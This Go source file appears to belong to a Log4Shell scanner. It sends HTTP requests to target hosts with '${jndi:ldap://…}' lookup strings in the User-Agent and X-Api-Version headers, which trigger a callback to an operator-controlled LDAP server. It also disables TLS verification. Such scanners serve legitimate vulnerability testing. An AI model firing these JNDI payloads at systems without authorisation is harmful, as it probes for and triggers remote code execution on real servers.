package cmd

import (
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
)

func ScanIP(hostUrl string, serverUrl string, wg *sync.WaitGroup, resChan chan string, connectTimeout int) {
	defer wg.Done()

	client := &http.Client{
		Timeout: 2 * time.Duration(connectTimeout) * time.Millisecond,
		Transport: &http.Transport{
			TLSHandshakeTimeout:   time.Duration(connectTimeout) * time.Millisecond,
			ResponseHeaderTimeout: time.Duration(connectTimeout) * time.Millisecond,
			ExpectContinueTimeout: time.Duration(connectTimeout) * time.Millisecond,
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		},
	}

	log.Debugf("Target URL: %s", hostUrl)
	baseUrl, err := url.Parse(hostUrl)
	param := url.Values{}
	targetUrl := baseUrl.String()

	traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())

	param.Add("x", fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint))
	baseUrl.RawQuery = param.Encode()
	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
	targetHeader := fmt.Sprintf("${jndi:ldap://%s/%s}", serverUrl, traceHint)
	//log.Debugf("Target User-Agent: %s", targetUserAgent)
	//log.Debugf("Target X-Api-Version: %s", targetHeader)
	request, err := http.NewRequest("GET", targetUrl, nil)
	if err != nil {
		pterm.Error.Println(err)
		log.Fatal(err)
	}
	request.Header.Set("User-Agent", targetUserAgent)
	request.Header.Add("X-Api-Version", targetHeader)
	response, err := client.Do(request)
	if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
		log.Debug(err)
	}
	if response != nil {
		url := strings.Split(hostUrl, ":")
		if len(url) != 3 {
			log.Fatal("Error in response hostUrl parsing:", url)
		}
		msg := fmt.Sprintf("request,%s,%s,%d", strings.Replace(url[1], "/", "", -1), url[2], response.StatusCode)
		updateCsvRecords(msg)
		resChan <- msg
		log.Infof(msg)
	}
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
